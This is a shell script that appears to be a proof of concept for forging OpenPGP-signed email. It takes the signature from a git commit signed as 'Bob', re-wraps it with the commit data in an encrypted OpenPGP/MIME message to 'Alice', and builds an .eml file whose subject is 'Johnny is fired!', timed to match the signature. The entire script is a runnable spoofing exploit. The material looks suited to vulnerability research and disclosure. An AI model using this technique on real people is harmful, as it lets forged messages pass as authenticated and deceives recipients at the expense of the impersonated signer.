#!/bin/env sh

GPG_KEY_ID=$(gpg --list-secret-keys --with-colons "bob@example.com" | grep '^sec' | cut -d: -f5)
git config --global user.name "Bob"
git config --global user.email "bob@example.com"
git config --global user.signingkey "$GPG_KEY_ID"
git config --global commit.gpgSign true

mkdir /bob
cd /bob
git init
echo "// TODO: fire event manager" > manager.cc
git add manager.cc
git commit -S -m "Fire the event manager immediately."

git cat-file commit HEAD | sed -e 's/^ //'| sed -e 's/gpgsig //' | gpg --dearmor > /tmp/signature.bin
git verify-commit -v HEAD | gpg -z0 --store > /tmp/plaintext.bin
# cat /tmp/signature.bin /tmp/plaintext.bin | gpg --enarmor > /tmp/spoofed-content.pgp
# sed -e 's/ARMORED FILE/MESSAGE/' \
#     -e '/^Comment:/d' /tmp/spoofed-content.pgp > /tmp/spoofed-mime.txt
cat /tmp/signature.bin /tmp/plaintext.bin | gpg -r alice@example.com --no-literal --encrypt --armor > /tmp/spoofed-mime.txt
TIMESTAMP=$(gpg --status-fd=1 --decrypt /tmp/spoofed-mime.txt | grep VALIDSIG | cut -d' ' -f5)
EMAILTIME=$(date -R -d "@$TIMESTAMP")
cat << EOF > /tmp/spoofed.eml
Date: $EMAILTIME
From: Bob <bob@example.com>
To: Alice <alice@example.com>
Subject: Johnny is fired!
MIME-Version: 1.0
Content-Type: multipart/encrypted;
 protocol="application/pgp-encrypted";
 boundary="XXX"

This is an OpenPGP/MIME encrypted message.
--XXX
Content-Type: application/pgp-encrypted

Version: 1

--XXX
Content-Type: application/octet-stream; name="encrypted.asc"
Content-Disposition: inline; filename="encrypted.asc"

EOF

cat /tmp/spoofed-mime.txt >> /tmp/spoofed.eml
cat <<EOF >> /tmp/spoofed.eml

--XXX--
EOF


